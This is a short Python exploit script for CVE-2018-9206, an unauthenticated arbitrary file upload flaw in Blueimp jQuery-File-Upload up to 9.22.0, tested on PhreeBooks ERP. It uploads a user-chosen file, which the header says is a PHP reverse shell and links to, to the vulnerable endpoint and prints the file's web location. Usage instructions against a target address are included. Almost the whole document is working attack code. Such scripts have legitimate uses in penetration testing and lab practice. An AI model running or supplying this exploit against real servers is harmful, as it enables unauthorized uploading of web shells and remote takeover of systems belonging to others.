#!/usr/bin/python3

"""
Author: Xtormin (Jennifer Torres)
Twitter: https://twitter.com/xtormin
Title:  Unauthenticated arbitrary file upload vulnerability in Blueimp jQuery-File-Upload <= v9.22.0
CVE: CVE-2018-9206
Tested on: PhreeBooks ERP 5.2.3 (Bizuno Library 3.1.7)
Based on: https://gist.github.com/islanddog/86a78eaa7d036c313d6c3d73c75b94e4
Webshell used: https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php
Usage example: python CVE-2018-9206.py -u http://10.11.1.123 -f rev.php
"""

import requests
import argparse

parser = argparse.ArgumentParser(add_help = True, description = '''
%(prog)s exploit for Blueimp's jQuery File Upload <= 9.22.0 with CVE-2018-9206. ''')

parser.add_argument('-u','--url', 
                    help = 'Example: http://192.168.1.100:90', 
                    nargs = '?', 
                    type=str, 
                    required=True)
parser.add_argument('-f','--filename', 
                    help = 'Filename of the reverse shell',
                    nargs = '?', 
                    type=str, 
                    required=True) 

if __name__=="__main__":
    args = parser.parse_args()

    host = args.url
    file_name = args.filename

    # JQuery path for Bizuno Library 3.1.7
    url = host + '/books/apps/jquery-file-upload/server/php/index.php'

    file_upload = {'files': open(file_name, 'rb')}

    print(f"\n|+| Uploading file in {url}")

    r = requests.post(url, files=file_upload)

    file_location = host + '/books/apps/jquery-file-upload/server/php/files/' + file_name
    print(f"\n|+| Location of the uploaded file: {file_location}")